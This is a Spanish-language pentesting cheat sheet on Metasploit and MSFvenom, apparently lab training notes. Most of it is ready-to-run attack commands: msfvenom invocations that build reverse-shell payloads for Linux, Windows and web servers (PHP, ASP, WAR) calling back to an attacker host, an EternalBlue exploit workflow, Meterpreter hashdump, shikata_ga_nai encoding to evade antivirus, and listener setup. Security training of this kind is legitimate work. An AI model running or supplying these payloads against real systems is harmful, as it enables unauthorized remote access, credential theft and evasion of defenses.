# Payloads metasploit

## Payloads — Metasploit y MSFvenom

### Tipos de payloads: staged vs stageless

Antes de generar un payload conviene entender la diferencia entre estos dos modelos, ya que afectan al tamaño del payload, la estabilidad de la conexión y la capacidad de evasión.

#### Staged (en etapas)

El payload se divide en dos partes. Primero se envía un **stager** pequeño que ejecuta en el objetivo y llama de vuelta al atacante para descargar el resto del payload (el **stage**). Ejemplo: `windows/meterpreter/reverse_tcp`.

```
Objetivo recibe stager pequeño
        ↓
Stager ejecuta y llama al atacante
        ↓
Atacante envía el stage completo (Meterpreter)
        ↓
Shell establecida
```

Ventaja: el stager es pequeño y puede evadir mejor ciertos controles. Desventaja: requiere dos conexiones, puede fallar en redes con latencia alta.

#### Stageless (sin etapas)

El payload completo se envía de una vez. Ejemplo: `windows/meterpreter_reverse_tcp`.

```
Objetivo recibe el payload completo
        ↓
Shell establecida directamente
```

Ventaja: más estable en redes con restricciones o latencia. Desventaja: el payload es mayor y más detectable por firmas AV.

#### Cómo identificarlos por el nombre

En Metasploit, la barra `/` separa las etapas del payload:

* `windows/meterpreter/reverse_tcp` → **staged** (meterpreter = stage, reverse\_tcp = cómo conecta)
* `windows/meterpreter_reverse_tcp` → **stageless** (todo junto)

***

### Metasploit Framework

Metasploit es el framework de explotación automatizada más usado. Organiza los módulos en categorías:

| Tipo         | Descripción                                  |
| ------------ | -------------------------------------------- |
| `exploit/`   | Módulos que explotan vulnerabilidades        |
| `auxiliary/` | Escaneo, enumeración, fuzzing                |
| `post/`      | Post-explotación (después de obtener acceso) |
| `payload/`   | El código que se ejecuta en el objetivo      |
| `encoder/`   | Codifican el payload para evadir AV          |
| `nop/`       | Instrucciones NOP para padding               |

#### Flujo de trabajo básico en msfconsole

```bash
# Iniciar Metasploit
sudo msfconsole

# Buscar módulos
msf6 > search smb
msf6 > search eternalblue
msf6 > search rconfig

# Seleccionar un módulo
msf6 > use exploit/windows/smb/ms17_010_psexec
# o por número en la lista de resultados:
msf6 > use 56

# Ver opciones del módulo
msf6 exploit(windows/smb/ms17_010_psexec) > options

# Configurar opciones
msf6 > set RHOSTS 10.10.10.10
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 4444
msf6 > set SMBUser administrador
msf6 > set SMBPass contraseña

# Lanzar el exploit
msf6 > exploit
# o:
msf6 > run
```

#### Meterpreter

Meterpreter es el payload avanzado de Metasploit. Usa inyección DLL en memoria para establecer un canal de comunicación cifrado — nunca escribe el agente en disco, lo que lo hace más sigiloso.

```bash
# Comandos útiles dentro de una sesión Meterpreter
meterpreter > help          # ver todos los comandos disponibles
meterpreter > getuid        # ver usuario actual
meterpreter > sysinfo       # información del sistema
meterpreter > ps            # listar procesos
meterpreter > hashdump      # dump de hashes SAM (requiere SYSTEM)
meterpreter > upload archivo.exe C:\\Windows\\Temp\\  # subir archivo
meterpreter > download C:\\archivo.txt ./             # descargar archivo
meterpreter > shell         # caer a una shell del sistema
meterpreter > background    # poner la sesión en background
meterpreter > sessions -l   # listar sesiones activas
meterpreter > sessions -i 1 # retomar sesión 1
```

***

### MSFvenom — Generación de payloads

MSFvenom combina MSFpayload y MSFencode en una sola herramienta para generar payloads standalone que pueden entregarse por cualquier método (email, descarga, USB...).

#### Sintaxis básica

```bash
msfvenom -p PAYLOAD LHOST=IP LPORT=PUERTO -f FORMATO > archivo.extensión
```

#### Listar payloads disponibles

```bash
msfvenom -l payloads
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep meterpreter
```

#### Payloads más usados

```bash
# Linux — ELF stageless
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf > shell.elf

# Linux — ELF staged (Meterpreter)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf > meterpreter.elf

# Windows — EXE stageless
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe > shell.exe

# Windows — EXE con Meterpreter (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe > meterpreter.exe

# Windows — DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f dll > shell.dll

# Windows — PowerShell (para ejecutar en memoria)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f psh > shell.ps1

# Web — PHP reverse shell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=443 -f raw > shell.php

# Web — ASP (para IIS)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f asp > shell.asp

# Web — WAR (para Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war > shell.war
```

#### Formato de salida (-f)

| Formato  | Extensión | Sistema       |
| -------- | --------- | ------------- |
| `elf`    | `.elf`    | Linux         |
| `exe`    | `.exe`    | Windows       |
| `dll`    | `.dll`    | Windows       |
| `asp`    | `.asp`    | IIS           |
| `aspx`   | `.aspx`   | IIS (.NET)    |
| `php`    | `.php`    | PHP           |
| `war`    | `.war`    | Java / Tomcat |
| `psh`    | `.ps1`    | PowerShell    |
| `raw`    | —         | Shellcode raw |
| `python` | `.py`     | Python        |
| `bash`   | `.sh`     | Bash          |

#### Payload con codificación para evadir AV básico

```bash
# Encoding con shikata_ga_nai (x86)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
    -e x86/shikata_ga_nai -i 5 \
    -f exe > shell_encoded.exe

# Ver encoders disponibles
msfvenom -l encoders
```

#### Listener en Metasploit para recibir el payload

```bash
# Iniciar handler para el payload generado
msf6 > use multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 443
msf6 > exploit -j   # -j = en background como job
```

***

### Tipos de archivos para Windows

| Tipo    | Descripción               | Uso en pentest                                      |
| ------- | ------------------------- | --------------------------------------------------- |
| **EXE** | Ejecutable nativo Windows | El más directo — doble clic o ejecución desde cmd   |
| **DLL** | Dynamic Linking Library   | DLL hijacking, carga mediante regsvr32              |
| **BAT** | Script DOS/batch          | Automatizar comandos en cmd                         |
| **VBS** | VBScript                  | Phishing, macros en documentos Office               |
| **MSI** | Instalador de Windows     | `msiexec /i payload.msi` — puede dar acceso elevado |
| **PS1** | PowerShell script         | Muy versátil, puede ejecutarse en memoria           |

> Para capturar una shell generada con MSFvenom sin usar Metasploit, basta con `nc -lvnp PUERTO`. Para shells básicas (`shell_reverse_tcp`) funciona perfectamente. Para Meterpreter se necesita el handler de Metasploit.

> Los payloads generados con MSFvenom **sin encoding** son detectados por Windows Defender y la mayoría de AV modernos. En entornos reales se necesita obfuscación adicional, uso de frameworks como Havoc/Cobalt Strike o técnicas de evasión avanzadas.
